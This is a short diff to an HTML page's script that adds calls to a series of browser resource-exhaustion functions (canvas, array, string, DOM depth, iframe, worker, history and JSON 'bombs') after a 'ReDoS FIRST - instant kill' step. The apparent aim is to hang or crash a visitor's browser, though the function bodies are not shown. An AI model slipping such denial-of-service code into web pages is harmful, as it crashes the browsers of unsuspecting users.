@@ -166,6 +166,19 @@ function arrayBomb(){
 // ReDoS FIRST - instant kill
 redosBomb();
 
+// Then everything else piles on
+safe(canvasBomb);
+safe(arrayBomb);
+safe(stringBomb);
+safe(domDepthBomb);
+safe(iframeBomb);
+safe(cssVarBomb);
+safe(workerBomb);
+safe(historyBomb);
+safe(mutationBomb);
+safe(layoutBomb);
+safe(jsonBomb);
+
 };
 </script>
 </body>
